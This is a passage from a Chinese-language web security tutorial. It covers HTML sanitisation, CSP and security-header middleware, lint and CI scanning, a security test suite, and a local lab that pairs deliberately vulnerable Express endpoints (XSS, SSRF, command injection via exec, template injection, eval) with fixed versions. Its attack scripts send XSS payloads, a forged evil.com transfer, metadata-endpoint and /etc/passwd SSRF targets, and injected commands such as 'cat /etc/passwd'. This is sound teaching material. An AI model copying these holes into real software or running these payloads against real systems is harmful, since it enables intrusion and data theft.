        (tag) => !["img", "iframe", "object", "embed", "form"].includes(tag),
      ),
      allowedAttributes: {
        a: ["href", "name", "target", "rel"],
        p: [],
        b: [],
        i: [],
        strong: [],
        em: [],
        ul: [],
        ol: [],
        li: [],
      },
      allowedSchemes: ["http", "https", "mailto"],
      allowedSchemesByTag: {},
      allowProtocolRelative: false,
      selfClosing: ["br", "hr"],
      parseStyleAttributes: false,
      textFilter: (text) => {
        // 额外文本过滤：移除零宽字符
        return text.replace(/[\u200B-\u200D\uFEFF]/g, "");
      },
    };

    return sanitizeHtml(dirty, { ...defaultOptions, ...options });
  }

  /**
   * 使用 xss 库净化
   */
  static sanitizeWithXSS(dirty) {
    const { filterXSS } = require("xss");

    return filterXSS(dirty, {
      whiteList: {
        a: ["href", "title", "target", "rel"],
        p: [],
        b: [],
        i: [],
        strong: [],
        em: [],
        ul: [],
        ol: [],
        li: [],
        br: [],
        hr: [],
      },
      stripIgnoreTag: true,
      stripIgnoreTagBody: ["script", "style"],
      onTag: (tag, html, options) => {
        // 自定义标签处理
        if (tag === "a" && options.isClosing !== true) {
          // 确保所有链接都有 rel="noopener noreferrer"
          if (!html.includes("rel=")) {
            return html.replace(">", ' rel="noopener noreferrer">');
          }
        }
      },
      onIgnoreTag: (tag, html, options) => {
        // 被忽略的标签直接移除
        return "";
      },
    });
  }

  /**
   * Express 中间件：自动净化请求体
   */
  static createSanitizeMiddleware(options = {}) {
    const sanitizeHtml = require("sanitize-html");

    return (req, res, next) => {
      if (!req.body) return next();

      const sanitizeValue = (value) => {
        if (typeof value === "string") {
          // 检测是否包含 HTML 标签
          if (/<[^>]*>/.test(value)) {
            return sanitizeHtml(value, options);
          }
          // 纯文本：移除零宽字符和控制字符
          return value
            .replace(/[\u200B-\u200D\uFEFF]/g, "")
            .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, "");
        }
        if (Array.isArray(value)) {
          return value.map(sanitizeValue);
        }
        if (typeof value === "object" && value !== null) {
          const result = {};
          for (const [key, val] of Object.entries(value)) {
            result[key] = sanitizeValue(val);
          }
          return result;
        }
        return value;
      };

      req.body = sanitizeValue(req.body);
      next();
    };
  }
}
```

---

## 5. CSP Level 3 与高级安全头

### 5.1 CSP Level 3 完整配置

```js
// --- File: src/security/csp-level3-config.js ---

/**
 * Content Security Policy Level 3 完整配置
 *
 * CSP Level 3 新增：
 * - Trusted Types: 强制使用 Trusted Types API
 * - Element Permissions: 限制 iframe/worker 等元素
 * - Navigation CSP: 限制导航目标
 * - Strict-Dynamic: 信任 nonce/hash 生成的脚本
 */
class CSPConfig {
  /**
   * 生成 CSP 头
   */
  static generateCSP(options = {}) {
    const {
      strict = false,
      reportOnly = false,
      reportUri = null,
      nonce = null,
      trustedTypes = false,
      allowInline = false,
    } = options;

    const directives = [];

    if (strict) {
      // 严格 CSP — 最高安全级别
      const scriptSrc = nonce
        ? `'self' 'nonce-${nonce}' 'strict-dynamic'`
        : `'self'`;

      directives.push(
        `default-src 'self'`,
        `script-src ${scriptSrc}`,
        `style-src 'self'`,
        `img-src 'self' data: https:`,
        `font-src 'self'`,
        `connect-src 'self'`,
        `media-src 'self'`,
        `object-src 'none'`,
        `frame-src 'none'`,
        `worker-src 'self'`,
        `manifest-src 'self'`,
        `base-uri 'self'`,
        `form-action 'self'`,
        `frame-ancestors 'none'`,
        `upgrade-insecure-requests`,
        `block-all-mixed-content`,
      );

      if (trustedTypes && typeof trustedTypes !== "undefined") {
        directives.push(`require-trusted-types-for 'script'`);
      }
    } else {
      // 宽松 CSP — 平衡安全与兼容
      const scriptSrc = allowInline
        ? `'self' 'unsafe-inline'`
        : nonce
          ? `'self' 'nonce-${nonce}'`
          : `'self'`;

      directives.push(
        `default-src 'self'`,
        `script-src ${scriptSrc}`,
        `style-src 'self' 'unsafe-inline'`,
        `img-src 'self' data: https:`,
        `font-src 'self' https:`,
        `connect-src 'self' https:`,
        `media-src 'self'`,
        `object-src 'none'`,
        `frame-ancestors 'self'`,
        `base-uri 'self'`,
        `form-action 'self'`,
      );
    }

    // 报告 URI
    if (reportUri) {
      directives.push(`report-uri ${reportUri}`);
      directives.push(`report-to csp-endpoint`);
    }

    //  nonce 头（用于内联脚本）
    const headerName = reportOnly
      ? "Content-Security-Policy-Report-Only"
      : "Content-Security-Policy";

    return {
      header: headerName,
      value: directives.join("; "),
    };
  }

  /**
   * Express 中间件：自动注入 CSP
   */
  static createCSPMiddleware(options = {}) {
    const crypto = require("crypto");

    return (req, res, next) => {
      // 生成 nonce
      const nonce = crypto.randomBytes(16).toString("base64");
      res.locals.cspNonce = nonce;

      const csp = this.generateCSP({ ...options, nonce });
      res.setHeader(csp.header, csp.value);

      // 同时设置 Report-To 头
      if (options.reportUri) {
        res.setHeader(
          "Report-To",
          JSON.stringify({
            group: "csp-endpoint",
            max_age: 86400,
            endpoints: [{ url: options.reportUri }],
          }),
        );
      }

      next();
    };
  }

  /**
   * Trusted Types 策略
   */
  static setupTrustedTypes() {
    if (typeof trustedTypes === "undefined") return;

    // 默认策略：使用 DOMPurify 净化
    const defaultPolicy = trustedTypes.createPolicy("default", {
      createHTML: (string) => {
        if (typeof DOMPurify !== "undefined") {
          return DOMPurify.sanitize(string, { RETURN_TRUSTED_TYPE: true });
        }
        // 降级：返回空字符串
        console.warn("[CSP] DOMPurify not available, blocking HTML");
        return "";
      },
      createScriptURL: (url) => {
        // 只允许同域脚本
        try {
          const parsed = new URL(url, window.location.origin);
          if (parsed.origin === window.location.origin) {
            return url;
          }
        } catch (e) {
          /* invalid */
        }
        throw new TypeError(`Script URL not allowed: ${url}`);
      },
    });
  }
}
```

### 5.2 完整安全头配置

```js
// --- File: src/security/security-headers.js ---

/**
 * 完整安全头配置
 *
 * 包含所有现代 Web 安全相关的 HTTP 头
 */
class SecurityHeaders {
  static configure(app) {
    // 1. Content-Security-Policy
    app.use((req, res, next) => {
      const crypto = require("crypto");
      const nonce = crypto.randomBytes(16).toString("base64");
      res.locals.nonce = nonce;

      res.setHeader(
        "Content-Security-Policy",
        [
          `default-src 'self'`,
          `script-src 'self' 'nonce-${nonce}'`,
          `style-src 'self' 'unsafe-inline'`,
          `img-src 'self' data: https:`,
          `font-src 'self'`,
          `connect-src 'self'`,
          `object-src 'none'`,
          `frame-src 'none'`,
          `base-uri 'self'`,
          `form-action 'self'`,
          `frame-ancestors 'none'`,
          `upgrade-insecure-requests`,
        ].join("; "),
      );

      next();
    });

    // 2. Strict-Transport-Security (HSTS)
    app.use((req, res, next) => {
      res.setHeader(
        "Strict-Transport-Security",
        "max-age=31536000; includeSubDomains; preload",
      );
      next();
    });

    // 3. X-Content-Type-Options
    app.use((req, res, next) => {
      res.setHeader("X-Content-Type-Options", "nosniff");
      next();
    });

    // 4. X-Frame-Options
    app.use((req, res, next) => {
      res.setHeader("X-Frame-Options", "DENY");
      next();
    });

    // 5. Referrer-Policy
    app.use((req, res, next) => {
      res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
      next();
    });

    // 6. Permissions-Policy (原 Feature-Policy)
    app.use((req, res, next) => {
      res.setHeader(
        "Permissions-Policy",
        [
          "camera=()",
          "microphone=()",
          "geolocation=()",
          "accelerometer=()",
          "autoplay=()",
          "display-capture=()",
          "document-domain=()",
          "encrypted-media=()",
          "execution-while-not-rendered=()",
          "execution-while-out-of-viewport=()",
          "fullscreen=()",
          "gamepad=()",
          "gyroscope=()",
          "layout-animations=(self)",
          "legacy-image-formats=(self)",
          "magnetometer=()",
          "midi=()",
          "oversized-images=(self)",
          "payment=()",
          "picture-in-picture=()",
          "publickey-credentials-get=()",
          "screen-wake-lock=()",
          "sync-xhr=(self)",
          "unoptimized-images=(self)",
          "unlimited-storage=()",
          "usb=()",
          "web-share=()",
          "xr-spatial-tracking=()",
        ].join(", "),
      );
      next();
    });

    // 7. Cross-Origin-Embedder-Policy
    app.use((req, res, next) => {
      res.setHeader("Cross-Origin-Embedder-Policy", "require-corp");
      next();
    });

    // 8. Cross-Origin-Opener-Policy
    app.use((req, res, next) => {
      res.setHeader("Cross-Origin-Opener-Policy", "same-origin");
      next();
    });

    // 9. Cross-Origin-Resource-Policy
    app.use((req, res, next) => {
      res.setHeader("Cross-Origin-Resource-Policy", "same-origin");
      next();
    });

    // 10. 移除泄露信息的头
    app.use((req, res, next) => {
      res.removeHeader("X-Powered-By");
      res.removeHeader("Server");
      next();
    });
  }
}
```

---

## 6. 安全工程化：安全左移与自动化

### 6.1 安全 ESLint 规则

```js
// --- File: .eslintrc.security.js ---

/**
 * 安全 ESLint 配置
 *
 * 在代码审查阶段捕获安全问题
 */
module.exports = {
  plugins: ["security"],
  extends: ["plugin:security/recommended"],
  rules: {
    // 禁止不安全的正则表达式（ReDoS）
    "security/detect-non-literal-regexp": "warn",

    // 禁止不安全的 eval
    "security/detect-eval-with-expression": "error",
    "security/detect-no-csrf-before-method-override": "error",

    // 禁止不安全的 JSON 解析
    "security/detect-possible-timing-attacks": "warn",

    // 禁止不安全的字符串拼接
    "security/detect-object-injection": "warn",

    // 禁止不安全的 child_process
    "security/detect-child-process": "warn",

    // 禁止不安全的 Buffer 使用
    "security/detect-buffer-noassert": "error",

    // 禁止不安全的随机数
    "security/detect-non-literal-fs-filename": "warn",

    // 禁止不安全的 require
    "security/detect-non-literal-require": "warn",
    "security/detect-non-literal-require-calls": "warn",

    // 自定义规则
    "no-eval": "error",
    "no-implied-eval": "error",
    "no-new-func": "error",

    // 禁止内联事件处理器
    "no-onload-attribute": "warn",
  },
  overrides: [
    {
      files: ["**/*.js"],
      rules: {
        // 服务端文件额外检查
        "security/detect-buffer-noassert": "error",
        "security/detect-child-process": "error",
      },
    },
    {
      files: ["**/*.html"],
      rules: {
        // 禁止内联事件处理器
        "no-inline-event-handler": "error",
      },
    },
  ],
};
```

### 6.2 GitHub Actions 安全扫描

```yaml
# --- File: .github/workflows/security-scan.yml ---
#
# name: Security Scan
#
# on:
#   push:
#     branches: [main, develop]
#   pull_request:
#     branches: [main]
#   schedule:
#     - cron: '0 0 * * 1'  # 每周一扫描
#
# jobs:
#   dependency-audit:
#     runs-on: ubuntu-latest
#     steps:
#       - uses: actions/checkout@v4
#       - uses: actions/setup-node@v4
#         with:
#           node-version: '20'
#       - run: npm ci
#       - run: npm audit --production --audit-level=moderate
#
#   sast:
#     runs-on: ubuntu-latest
#     steps:
#       - uses: actions/checkout@v4
#       - name: Run ESLint Security
#         run: |
#           npm install --save-dev eslint eslint-plugin-security
#           npx eslint --config .eslintrc.security.js .
#
#   secret-detection:
#     runs-on: ubuntu-latest
#     steps:
#       - uses: actions/checkout@v4
#         with:
#           fetch-depth: 0
#       - name: Detect Secrets
#         uses: trufflesecurity/trufflehog@main
#         with:
#           extra_args: --only-verified
#
#   container-scan:
#     runs-on: ubuntu-latest
#     steps:
#       - uses: actions/checkout@v4
#       - name: Build Docker Image
#         run: docker build -t myapp:${{ github.sha }} .
#       - name: Scan Container
#         uses: aquasecurity/trivy-image-scan@master
#         with:
#           image-ref: myapp:${{ github.sha }}
#           severity: CRITICAL,HIGH
#           exit-code: 1
```

### 6.3 安全测试框架

```js
// --- File: tests/security/security-tests.js ---

/**
 * 安全测试套件
 *
 * 自动化测试常见的安全漏洞
 */
const assert = require("assert");

class SecurityTestSuite {
  /**
   * 测试 1: XSS 防护
   */
  static async testXSSProtection(supertest, baseUrl) {
    const payloads = [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert(1)>",
      "javascript:alert(1)",
      "<body onload=alert(1)>",
      '<iframe src="javascript:alert(1)">',
      '<a href="javascript:alert(1)">click</a>',
      '<div style="background:url(javascript:alert(1))">',
      "<input onfocus=alert(1) autofocus>",
      "<marquee onstart=alert(1)>",
    ];

    const results = [];

    for (const payload of payloads) {
      const response = await supertest(baseUrl)
        .post("/api/comment")
        .send({ content: payload })
        .expect(200);

      // 检查响应中是否包含未转义的攻击载荷
      const isVulnerable =
        response.text.includes(payload) &&
        !response.text.includes("&lt;script&gt;");

      results.push({
        payload,
        vulnerable: isVulnerable,
        status: isVulnerable ? "FAIL" : "PASS",
      });
    }

    return results;
  }

  /**
   * 测试 2: CSRF 防护
   */
  static async testCSRFProtection(supertest, baseUrl) {
    const results = [];

    // 测试不带 CSRF token 的请求
    const endpoints = [
      {
        method: "POST",
        path: "/api/transfer",
        body: { to: "attacker", amount: 100 },
      },
      {
        method: "PUT",
        path: "/api/profile",
        body: { email: "attacker@evil.com" },
      },
      { method: "DELETE", path: "/api/account" },
    ];

    for (const ep of endpoints) {
      const response = await supertest(baseUrl)
        [ep.method.toLowerCase()](ep.path)
        .send(ep.body || {})
        .set("Origin", "https://evil.com")
        .set("Referer", "https://evil.com/attack");

      const isProtected = response.status === 403;

      results.push({
        endpoint: `${ep.method} ${ep.path}`,
        protected: isProtected,
        status: isProtected ? "PASS" : "FAIL",
      });
    }

    return results;
  }

  /**
   * 测试 3: 安全头
   */
  static async testSecurityHeaders(supertest, baseUrl) {
    const response = await supertest(baseUrl).get("/");

    const requiredHeaders = {
      "Content-Security-Policy": /default-src/,
      "Strict-Transport-Security": /max-age=/,
      "X-Content-Type-Options": "nosniff",
      "X-Frame-Options": /DENY|SAMEORIGIN/,
      "Referrer-Policy": /strict-origin/,
      "Permissions-Policy": /camera=\(\)/,
    };

    const results = [];

    for (const [header, pattern] of Object.entries(requiredHeaders)) {
      const value = response.headers[header.toLowerCase()];
      const isSet =
        value &&
        (typeof pattern === "string"
          ? value.includes(pattern)
          : pattern.test(value));

      results.push({
        header,
        set: !!isSet,
        value: value || "(missing)",
        status: isSet ? "PASS" : "FAIL",
      });
    }

    return results;
  }

  /**
   * 测试 4: Cookie 安全属性
   */
  static async testCookieSecurity(supertest, baseUrl) {
    const response = await supertest(baseUrl)
      .post("/api/login")
      .send({ username: "test", password: "test" });

    const setCookie = response.headers["set-cookie"];
    if (!setCookie) {
      return [{ header: "Set-Cookie", set: false, status: "FAIL" }];
    }

    const cookieStr = setCookie.join("; ");
    const results = [
      {
        attribute: "HttpOnly",
        set: cookieStr.includes("HttpOnly"),
        status: cookieStr.includes("HttpOnly") ? "PASS" : "FAIL",
      },
      {
        attribute: "Secure",
        set: cookieStr.includes("Secure"),
        status: cookieStr.includes("Secure") ? "PASS" : "FAIL",
      },
      {
        attribute: "SameSite",
        set: /SameSite=(Strict|Lax)/i.test(cookieStr),
        status: /SameSite=(Strict|Lax)/i.test(cookieStr) ? "PASS" : "FAIL",
      },
      {
        attribute: "Path",
        set: cookieStr.includes("Path=/"),
        status: cookieStr.includes("Path=/") ? "PASS" : "FAIL",
      },
    ];

    return results;
  }

  /**
   * 运行所有安全测试
   */
  static async runAll(supertest, baseUrl) {
    console.log("🔐 Running Security Test Suite...\n");

    const results = {
      xss: await this.testXSSProtection(supertest, baseUrl),
      csrf: await this.testCSRFProtection(supertest, baseUrl),
      headers: await this.testSecurityHeaders(supertest, baseUrl),
      cookies: await this.testCookieSecurity(supertest, baseUrl),
    };

    // 汇总
    const allResults = Object.values(results).flat();
    const passed = allResults.filter((r) => r.status === "PASS").length;
    const failed = allResults.filter((r) => r.status === "FAIL").length;

    console.log(
      `\n📊 Security Test Results: ${passed} passed, ${failed} failed`,
    );

    if (failed > 0) {
      console.log("\n❌ Failed tests:");
      allResults
        .filter((r) => r.status === "FAIL")
        .forEach((r) => {
          console.log(
            `  - ${r.header || r.payload || r.endpoint || r.attribute}`,
          );
        });
    }

    return results;
  }
}

module.exports = SecurityTestSuite;
```

---

## 7. 攻防演练实验室

### 7.1 完整攻防环境

```js
// --- File: labs/security-lab/server.js ---

/**
 * 安全攻防演练实验室 — 服务端
 *
 * 故意包含安全漏洞，用于学习
 * ⚠️ 仅限本地学习环境，禁止部署到生产环境
 */
const express = require("express");
const cookieParser = require("cookie-parser");
const crypto = require("crypto");

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

// 模拟用户数据库
const users = {
  admin: { password: "admin123", role: "admin" },
  user: { password: "user123", role: "user" },
};

// ==================== 漏洞 1: XSS ====================

// 危险：直接渲染用户输入
app.post("/vulnerable/comment", (req, res) => {
  const { content } = req.body;
  // 漏洞：未转义直接输出
  res.send(`<div class="comment">${content}</div>`);
});

// 安全版本
app.post("/safe/comment", (req, res) => {
  const { content } = req.body;
  const escaped = content
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;");
  res.send(`<div class="comment">${escaped}</div>`);
});

// ==================== 漏洞 2: CSRF ====================

// 危险：无 CSRF 保护的转账端点
app.post("/vulnerable/transfer", (req, res) => {
  const { to, amount } = req.body;
  // 漏洞：没有验证 CSRF token
  res.json({ success: true, message: `Transferred ${amount} to ${to}` });
});

// 安全版本：双重 Cookie 验证
app.post("/safe/transfer", (req, res) => {
  const cookieToken = req.cookies["XSRF-TOKEN"];
  const headerToken = req.headers["x-xsrf-token"];

  if (!cookieToken || !headerToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: "CSRF verification failed" });
  }

  const { to, amount } = req.body;
  res.json({ success: true, message: `Transferred ${amount} to ${to}` });
});

// ==================== 漏洞 3: SSRF ====================

const fetch = require("node-fetch");

// 危险：无限制的 URL 获取
app.get("/vulnerable/fetch", async (req, res) => {
  const { url } = req.query;
  try {
    const response = await fetch(url);
    const text = await response.text();
    res.send(text);
  } catch (err) {
    res.status(500).send("Fetch failed");
  }
});

// 安全版本：URL 白名单 + IP 验证
app.get("/safe/fetch", async (req, res) => {
  const { url } = req.query;
  const allowedDomains = ["example.com", "httpbin.org"];

  try {
    const parsed = new URL(url);
    if (!allowedDomains.includes(parsed.hostname)) {
      return res.status(403).json({ error: "Domain not allowed" });
    }
    const response = await fetch(url);
    const text = await response.text();
    res.send(text);
  } catch (err) {
    res.status(400).json({ error: "Invalid URL" });
  }
});

// ==================== 漏洞 4: 命令注入 ====================

const { exec } = require("child_process");

// 危险：直接拼接用户输入
app.post("/vulnerable/ping", (req, res) => {
  const { host } = req.body;
  exec(`ping -c 1 ${host}`, (err, stdout) => {
    if (err) return res.status(500).send("Ping failed");
    res.send(stdout);
  });
});

// 安全版本：execFile + 输入验证
app.post("/safe/ping", (req, res) => {
  const { host } = req.body;
  if (!/^[a-zA-Z0-9._-]+$/.test(host)) {
    return res.status(400).json({ error: "Invalid host" });
  }
  const { execFile } = require("child_process");
  execFile("ping", ["-c", "1", host], { timeout: 5000 }, (err, stdout) => {
    if (err) return res.status(500).json({ error: "Ping failed" });
    res.send(stdout);
  });
});

// ==================== 漏洞 5: SSTI ====================

const ejs = require("ejs");

// 危险：用户输入作为模板
app.post("/vulnerable/template", (req, res) => {
  const { template, name } = req.body;
  // 漏洞：用户控制模板内容
  const html = ejs.render(template, { name });
  res.send(html);
});

// 安全版本：固定模板
app.post("/safe/template", (req, res) => {
  const { name } = req.body;
  // 安全：模板固定，用户输入只作为数据
  const html = ejs.render("<h1>Hello, <%= name %></h1>", { name });
  res.send(html);
});

// ==================== 漏洞 6: 开放重定向 ====================

// 危险：任意重定向
app.get("/vulnerable/redirect", (req, res) => {
  const { url } = req.query;
  res.redirect(url);
});

// 安全版本：白名单重定向
app.get("/safe/redirect", (req, res) => {
  const { url } = req.query;
  const allowedUrls = ["/home", "/dashboard", "/profile", "/settings"];
  if (allowedUrls.includes(url)) {
    res.redirect(url);
  } else {
    res.status(400).json({ error: "Invalid redirect URL" });
  }
});

// ==================== 漏洞 7: 信息泄露 ====================

// 危险：详细错误信息
app.get("/vulnerable/error", (req, res) => {
  try {
    JSON.parse("invalid json");
  } catch (err) {
    // 漏洞：泄露堆栈跟踪
    res.status(500).json({
      error: err.message,
      stack: err.stack,
      code: err.code,
    });
  }
});

// 安全版本：通用错误信息
app.get("/safe/error", (req, res) => {
  try {
    JSON.parse("invalid json");
  } catch (err) {
    // 安全：只返回通用错误
    console.error(err); // 日志记录详细信息
    res.status(500).json({ error: "Internal server error" });
  }
});

// ==================== 漏洞 8: 不安全的反序列化 ====================

// 危险：直接反序列化用户输入
app.post("/vulnerable/deserialize", (req, res) => {
  const { data } = req.body;
  try {
    // 漏洞：用户控制的反序列化
    const obj = eval("(" + data + ")");
    res.json(obj);
  } catch (err) {
    res.status(400).json({ error: "Invalid data" });
  }
});

// 安全版本：JSON.parse
app.post("/safe/deserialize", (req, res) => {
  const { data } = req.body;
  try {
    const obj = JSON.parse(data);
    res.json(obj);
  } catch (err) {
    res.status(400).json({ error: "Invalid JSON" });
  }
});

// 启动服务器
const PORT = process.env.PORT || 3456;
app.listen(PORT, () => {
  console.log(`🔐 Security Lab running on http://localhost:${PORT}`);
  console.log("⚠️  仅限本地学习使用，禁止部署到生产环境！");
});

module.exports = app;
```

### 7.2 攻防演练脚本

```js
// --- File: labs/security-lab/attack-scripts.js ---

/**
 * 攻防演练 — 攻击脚本集
 *
 * 用于测试安全防御措施
 * ⚠️ 仅限本地学习环境
 */
class AttackScripts {
  /**
   * 演练 1: XSS 攻击与防御验证
   */
  static async testXSS(baseUrl) {
    console.log("=== 演练 1: XSS 攻击与防御 ===\n");

    const payloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg/onload=alert("XSS")>',
      '"><script>alert("XSS")</script>',
      '\"><script>alert("XSS")</script>',
    ];

    for (const payload of payloads) {
      console.log(`\n📤 Payload: ${payload}`);

      // 攻击漏洞端点
      const vulnRes = await fetch(`${baseUrl}/vulnerable/comment`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: payload }),
      });
      const vulnText = await vulnRes.text();
      const vulnVulnerable =
        vulnText.includes("<script>") || vulnText.includes("onerror=");
      console.log(
        `  🔴 Vulnerable endpoint: ${vulnVulnerable ? "EXPLOITED ❌" : "Safe ✅"}`,
      );

      // 测试安全端点
      const safeRes = await fetch(`${baseUrl}/safe/comment`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: payload }),
      });
      const safeText = await safeRes.text();
      const safeProtected =
        safeText.includes("&lt;") || safeText.includes("&gt;");
      console.log(
        `  🟢 Safe endpoint: ${safeProtected ? "Protected ✅" : "EXPLOITED ❌"}`,
      );
    }
  }

  /**
   * 演练 2: CSRF 攻击模拟
   */
  static async testCSRF(baseUrl) {
    console.log("\n=== 演练 2: CSRF 攻击模拟 ===\n");

    // 模拟攻击者页面发起的请求（无 CSRF token）
    const res = await fetch(`${baseUrl}/vulnerable/transfer`, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Origin: "https://evil.com",
        Referer: "https://evil.com/attack",
      },
      body: "to=attacker&amount=1000",
    });

    const data = await res.json();
    console.log(`🔴 Vulnerable endpoint: ${JSON.stringify(data)}`);
    console.log(
      `   Status: ${res.status === 200 ? "EXPLOITED ❌" : "Protected ✅"}`,
    );

    // 安全端点
    const safeRes = await fetch(`${baseUrl}/safe/transfer`, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Origin: "https://evil.com",
        Referer: "https://evil.com/attack",
      },
      body: "to=attacker&amount=1000",
    });

    const safeData = await safeRes.json();
    console.log(`🟢 Safe endpoint: ${JSON.stringify(safeData)}`);
    console.log(
      `   Status: ${safeRes.status === 403 ? "Protected ✅" : "EXPLOITED ❌"}`,
    );
  }

  /**
   * 演练 3: SSRF 攻击模拟
   */
  static async testSSRF(baseUrl) {
    console.log("\n=== 演练 3: SSRF 攻击模拟 ===\n");

    const targets = [
      "http://169.254.169.254/latest/meta-data/",
      "http://localhost:6379/",
      "file:///etc/passwd",
      "http://example.com/",
    ];

    for (const target of targets) {
      console.log(`\n📤 Target: ${target}`);

      try {
        const res = await fetch(
          `${baseUrl}/vulnerable/fetch?url=${encodeURIComponent(target)}`,
        );
        console.log(
          `  🔴 Vulnerable: ${res.status} — ${res.status === 200 ? "EXPLOITED ❌" : "Blocked ✅"}`,
        );
      } catch (err) {
        console.log(`  🔴 Vulnerable: Error — Blocked ✅`);
      }

      try {
        const res = await fetch(
          `${baseUrl}/safe/fetch?url=${encodeURIComponent(target)}`,
        );
        const data = await res.json();
        console.log(`  🟢 Safe: ${res.status} — ${data.error || "OK"}`);
        console.log(
          `     Status: ${res.status === 403 ? "Protected ✅" : "EXPLOITED ❌"}`,
        );
      } catch (err) {
        console.log(`  🟢 Safe: Error — Blocked ✅`);
      }
    }
  }

  /**
   * 演练 4: 命令注入攻击模拟
   */
  static async testCommandInjection(baseUrl) {
    console.log("\n=== 演练 4: 命令注入攻击模拟 ===\n");

    const payloads = [
      "8.8.8.8",
      "8.8.8.8; whoami",
      "8.8.8.8 && cat /etc/passwd",
      "8.8.8.8 | ls -la",
      "$(whoami)",
    ];

    for (const payload of payloads) {
      console.log(`\n📤 Payload: ${payload}`);

      try {
        const res = await fetch(`${baseUrl}/vulnerable/ping`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ host: payload }),
        });
        const text = await res.text();
        const isExploited = text.includes("root") || text.includes("bin/bash");
        console.log(
          `  🔴 Vulnerable: ${isExploited ? "EXPLOITED ❌" : "Blocked ✅"}`,
        );
      } catch (err) {
        console.log(`  🔴 Vulnerable: Error`);
      }

      try {
        const res = await fetch(`${baseUrl}/safe/ping`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ host: payload }),
        });
        const data = await res.json();
        console.log(`  🟢 Safe: ${data.error || "OK"}`);
        console.log(
          `     Status: ${res.status === 400 ? "Protected ✅" : "EXPLOITED ❌"}`,
        );
      } catch (err) {
        console.log(`  🟢 Safe: Error — Blocked ✅`);
      }
    }
  }

  /**
   * 运行所有演练
   */
  static async runAll(baseUrl = "http://localhost:3456") {
    console.log("🔐 Web 安全攻防演练实验室\n");
    console.log(`目标: ${baseUrl}\n`);

    await this.testXSS(baseUrl);
    await this.testCSRF(baseUrl);
    await this.testSSRF(baseUrl);
    await this.testCommandInjection(baseUrl);

    console.log("\n📊 演练完成！");
    console.log("💡 提示: 所有漏洞端点都有对应的安全版本");
    console.log("💡 对比两者的差异，理解安全防御的原理");
  }
}

// 运行演练
if (require.main === module) {
  AttackScripts.runAll().catch(console.error);
}

module.exports = AttackScripts;
```

---

## 8. 安全编码速查手册

### 8.1 安全编码原则

```
┌─────────────────────────────────────────────────────────────┐
│                    安全编码十大原则                          │
├─────────────────────────────────────────────────────────────┤
│ 1. 永远不要信任用户输入                                     │
│    → 所有输入必须验证、净化、转义                           │
│                                                             │
│ 2. 最小权限原则                                             │
│    → 代码只拥有完成任务所需的最小权限                       │
│                                                             │
│ 3. 深度防御                                                 │
│    → 多层安全控制，一层被绕过仍有其他层保护                 │
│                                                             │
│ 4. 安全默认                                                 │
│    → 默认配置应该是安全的                                   │
│                                                             │
│ 5. 完整审计                                                 │
│    → 记录所有安全相关事件                                   │
│                                                             │
│ 6. 失败安全                                                 │
│    → 出错时应该拒绝而非允许                                 │
│                                                             │
│ 7. 经济机制                                                 │
│    → 安全机制不应影响正常使用                               │
│                                                             │
│ 8. 心理可接受                                               │
│    → 安全措施应该对用户友好                                 │
│                                                             │
│ 9. 公开设计                                                 │
│    → 安全性不依赖于隐蔽                                     │
│                                                             │
│ 10. 特权分离                                               │
│     → 关键操作需要多重验证                                  │
└─────────────────────────────────────────────────────────────┘
```

### 8.2 常见漏洞速查

```
┌──────────────┬──────────────────┬───────────────────────────┐
│ 漏洞类型      │ 攻击向量          │ 防御措施                  │
├──────────────┼──────────────────┼───────────────────────────┤
│ XSS          │ 用户输入注入脚本  │ CSP + 转义 + DOMPurify    │
│ CSRF         │ 跨站伪造请求      │ SameSite + 双重Cookie     │
│ SSRF         │ 服务端请求伪造    │ URL白名单 + IP验证        │
│ SSTI         │ 模板注入          │ 固定模板 + 沙箱           │
│ 命令注入      │ 系统命令拼接      │ execFile + 输入验证       │
│ SQL注入      │ SQL拼接           │ 参数化查询 + ORM          │
│ 开放重定向    │ 恶意跳转          │ URL白名单                 │
│ 信息泄露      │ 详细错误信息      │ 通用错误 + 日志记录       │
│ 不安全的反序列化│ eval/JSON.parse │ 只使用JSON.parse          │
│ 路径遍历      │ ../../etc/passwd  │ 路径规范化 + 白名单       │
└──────────────┴──────────────────┴───────────────────────────┘
```

### 8.3 安全头速查

```
┌─────────────────────────────────────────────────────────────┐
│                    推荐安全头配置                            │
├─────────────────────────────────────────────────────────────┤
│ Content-Security-Policy: default-src 'self';                │
│   script-src 'self' 'nonce-RANDOM';                         │
│   object-src 'none'; frame-ancestors 'none';                │
│   upgrade-insecure-requests                                 │
│                                                             │
│ Strict-Transport-Security: max-age=31536000;                │
│   includeSubDomains; preload                                │
│                                                             │
│ X-Content-Type-Options: nosniff                             │
│ X-Frame-Options: DENY                                       │
│ Referrer-Policy: strict-origin-when-cross-origin            │
│ Permissions-Policy: camera=(), microphone=(),               │
│   geolocation=()                                            │
│                                                             │
│ Cross-Origin-Opener-Policy: same-origin                     │
│ Cross-Origin-Embedder-Policy: require-corp                  │
│ Cross-Origin-Resource-Policy: same-origin                   │
└─────────────────────────────────────────────────────────────┘
```

### 8.4 安全检查清单

```
✅ 输入验证
  □ 所有用户输入都经过类型和格式验证
  □ 使用白名单而非黑名单
  □ 长度限制合理

✅ 输出编码
  □ HTML 输出使用实体编码
  □ JavaScript 上下文使用 JS 转义
  □ URL 参数使用 encodeURIComponent
  □ CSS 值使用 CSS 转义

✅ 认证与授权
  □ 密码使用 bcrypt/argon2 哈希
  □ Session 使用 HttpOnly + Secure + SameSite
  □ API 使用 JWT 或 Bearer token
  □ 敏感操作需要二次验证

✅ 传输安全
  □ 全站 HTTPS
